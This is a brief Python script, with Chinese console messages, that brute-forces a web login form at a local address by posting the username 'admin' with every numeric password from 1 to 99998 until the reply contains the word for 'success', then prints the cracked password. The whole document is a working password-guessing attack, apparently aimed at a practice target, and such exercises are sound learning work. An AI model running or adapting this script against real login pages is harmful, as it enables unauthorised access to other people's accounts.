from requests import post
url='http://127.0.0.1:895'
for i in range(1,99999):
    data={
        'user':"admin",
        'pwd':str(i)
    }
    res=post(url=url,data=data)
    print('测试密码：',i)
    if("成功" in res.text):
        print("破解成功，密码是：",i)
        break

